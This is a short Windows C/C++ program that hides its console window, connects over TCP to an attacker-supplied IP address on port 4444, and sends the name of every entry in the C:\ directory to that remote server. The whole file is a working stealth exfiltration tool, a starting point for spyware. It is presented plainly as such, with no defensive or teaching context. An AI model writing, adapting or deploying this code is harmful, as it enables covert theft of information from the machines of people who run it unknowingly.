#include <winsock2.h>
#include <ws2tcpip.h>
#include <dirent.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "Ws2_32.lib")
using namespace std;
int main() {
 WSADATA wsaData;
 SOCKET s;
 struct sockaddr_in server;
 int my_result;
 ShowWindow(GetConsoleWindow(), SW_HIDE);
 my_result = WSAStartup(MAKEWORD(2,2), &wsaData);	
 	if (my_result != 0) {
 		printf("WSAStartup failed: %d\n", my_result);
 		return 1; 		
	 }
	 printf("Initialised.\n");
	 if ((s = socket(AF_INET , SOCK_STREAM , 0)) == INVALID_SOCKET)
	 {
	 	printf("COULD NOT CREATE SOCKET : %d", WSAGetLastError());
	 }
	 printf("Socket Created.\n"); 
	 server.sin_addr.s_addr = inet_addr("Change-this-to-your-ip-address"); //Connecting to IP address.
	 server.sin_family = AF_INET;
	 server.sin_port = htons(4444); //select port to connect to
	//The code below is to establish connection to remote server
	if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
		{
			puts("connect error");
			return 1;
		}
		puts("Connected");
		printf("Send packet");
	DIR *dir;
struct dirent *ent;
if ((dir = opendir ("c:\\")) != NULL) {
  // print all the files and directories within directory 
  while ((ent = readdir (dir)) != NULL) {
  	send(s, ent->d_name, sizeof(ent->d_name), 0); //This code is to send all directory to the remote server.
    printf ("%s\n\n\n", ent->d_name); // List files.
  }
  closedir (dir); // Close directory.
} else {
  /* could not open directory */
  perror ("");
}				
}
